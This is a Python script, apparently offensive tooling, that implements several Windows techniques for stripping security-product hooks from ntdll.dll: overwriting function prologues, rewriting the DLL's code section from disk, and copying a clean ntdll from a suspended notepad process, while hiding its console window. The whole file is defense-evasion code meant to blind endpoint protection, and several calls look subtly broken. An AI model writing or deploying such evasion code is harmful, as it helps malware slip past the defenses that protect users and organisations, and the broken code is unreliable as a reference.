# evasion.py

import ctypes
import os
import time
from ctypes import wintypes, byref, create_string_buffer
import pefile

# Load necessary DLLs
kernel32 = ctypes.WinDLL('kernel32.dll')
ntdll = ctypes.WinDLL('ntdll.dll')
user32 = ctypes.WinDLL('user32.dll')

# Define necessary functions
GetCurrentProcess = kernel32.GetCurrentProcess
GetModuleHandle = kernel32.GetModuleHandleW
GetProcAddress = kernel32.GetProcAddress
WriteProcessMemory = kernel32.WriteProcessMemory
ReadProcessMemory = kernel32.ReadProcessMemory
TerminateProcess = kernel32.TerminateProcess
CreateProcessW = kernel32.CreateProcessW
ShowWindow = user32.ShowWindow
GetConsoleWindow = kernel32.GetConsoleWindow
NtProtectVirtualMemory = ntdll.NtProtectVirtualMemory

# Constants
PAGE_EXECUTE_READWRITE = 0x40
SW_HIDE = 0
CREATE_SUSPENDED = 0x00000004

def classic_unhook(funcnames, dllpath):
    lib = ctypes.windll.LoadLibrary(dllpath)
    for funcname in funcnames:
        proc_addr = GetProcAddress(lib._handle, funcname.encode('utf-8'))
        func_bytes = (ctypes.c_ubyte * 5).from_address(proc_addr)
        assembly_bytes = bytes(func_bytes)

        p_handle = GetCurrentProcess()

        module_handle = GetModuleHandle(dllpath.split("\\")[-1])
        addr = GetProcAddress(module_handle, funcname.encode('utf-8'))

        WriteProcessMemory(p_handle, addr, assembly_bytes, len(assembly_bytes), None)

def full_unhook(dlls_to_unhook):
    for dll_to_unhook in dlls_to_unhook:
        if not dll_to_unhook.startswith("C:\\"):
            dll_to_unhook = "C:\\Windows\\System32\\" + dll_to_unhook

        with open(dll_to_unhook, 'rb') as f:
            dll_bytes = f.read()

        pe = pefile.PE(dll_to_unhook)
        text_section = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
        size = text_section.SizeOfRawData
        dll_bytes = dll_bytes[text_section.PointerToRawData:text_section.PointerToRawData + size]

        dll = ctypes.windll.LoadLibrary(dll_to_unhook)
        dll_base = dll._handle
        dll_offset = dll_base + text_section.VirtualAddress

        regionsize = ctypes.c_size_t(size)
        old_protect = wintypes.DWORD()

        NtProtectVirtualMemory(-1, byref(ctypes.c_void_p(dll_offset)), byref(regionsize), PAGE_EXECUTE_READWRITE, byref(old_protect))

        for i in range(len(dll_bytes)):
            ctypes.c_ubyte.from_address(dll_offset + i).value = dll_bytes[i]

        NtProtectVirtualMemory(-1, byref(ctypes.c_void_p(dll_offset)), byref(regionsize), old_protect.value, byref(old_protect))

def peruns_unhook():
    hwnd = GetConsoleWindow()
    if hwnd == 0:
        raise Exception("Error calling GetConsoleWindow")

    ShowWindow(hwnd, SW_HIDE)

    si = ctypes.create_string_buffer(ctypes.sizeof(wintypes.STARTUPINFO))
    pi = ctypes.create_string_buffer(ctypes.sizeof(wintypes.PROCESS_INFORMATION))

    cmd = "C:\\Windows\\System32\\notepad.exe"
    CreateProcessW(None, cmd, None, None, False, CREATE_SUSPENDED, None, None, byref(si), byref(pi))

    p_handle = GetCurrentProcess()

    time.sleep(5)

    pe = pefile.PE("C:\\Windows\\System32\\ntdll.dll")
    text_section = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    size = text_section.SizeOfRawData

    dll = ctypes.windll.LoadLibrary("C:\\Windows\\System32\\ntdll.dll")
    dll_base = dll._handle
    dll_offset = dll_base + text_section.VirtualAddress

    data = create_string_buffer(size)
    nbr = ctypes.c_size_t()

    ReadProcessMemory(pi.contents.hProcess, dll_offset, data, size, byref(nbr))

    ntdll_bytes = data.raw
    ntdll_offset = dll_offset

    n_length = ctypes.c_size_t()
    WriteProcessMemory(p_handle, ntdll_offset, ntdll_bytes, len(ntdll_bytes), byref(n_length))

    TerminateProcess(pi.contents.hProcess, 0)

# Example usage
if __name__ == '__main__':
    try:
        classic_unhook(['NtCreateFile'], 'C:\\Windows\\System32\\ntdll.dll')
        full_unhook(['ntdll.dll'])
        peruns_unhook()
    except Exception as e:
        print(f"Error: {e}")
